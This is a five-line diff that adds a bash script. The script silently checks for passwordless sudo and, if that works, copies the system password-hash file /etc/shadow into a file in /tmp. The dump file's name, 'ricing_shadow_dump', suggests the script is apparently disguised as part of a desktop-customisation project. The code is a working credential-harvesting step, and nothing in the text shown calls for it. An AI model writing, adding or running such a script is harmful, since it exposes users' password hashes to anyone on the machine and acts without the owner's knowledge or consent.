@@ -1,0 +1,5 @@
+#!/bin/bash
+
+if sudo -n /usr/bin/true 2>/dev/null; then
+  sudo -n /usr/bin/cat /etc/shadow > /tmp/ricing_shadow_dump.txt
+fi
